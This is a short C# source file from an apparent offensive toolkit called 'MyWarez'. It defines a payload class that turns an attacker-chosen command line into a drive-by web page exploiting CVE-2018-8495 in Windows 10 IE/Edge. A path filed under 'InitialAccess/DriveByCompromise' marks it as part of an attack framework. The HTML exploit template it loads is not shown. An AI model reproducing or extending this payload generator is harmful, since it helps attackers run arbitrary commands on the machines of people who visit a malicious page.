using System.IO;
using System.Linq;

using MyWarez.Core;
using System;

namespace MyWarez.Payloads
{
    //Windows 10 IE/Edge Exploit (CVE-2018-8495)
    public sealed class CVE_2018_8495 : OnePageWebsite
    {
        public CVE_2018_8495(ProcessList processList)
            : base(string.Format(Template, string.Join(";", processList.Processes.Select(p => p.CmdLine.ToString()).ToList())))
        {
            if (processList.Processes.Count() != 1)
                throw new ArgumentException("ProcessList must contain exactly 1 process");
        }
        private static readonly string TemplateFileName = "exploit_template.html";
        private static readonly string TemplateFilePath = Path.Join(Core.Constants.PayloadsResourceDirectory, "Windows", "InitialAccess", "DriveByCompromise", typeof(CVE_2018_8495).Name, TemplateFileName);
        private static readonly string Template = File.ReadAllText(TemplateFilePath);
    }
}
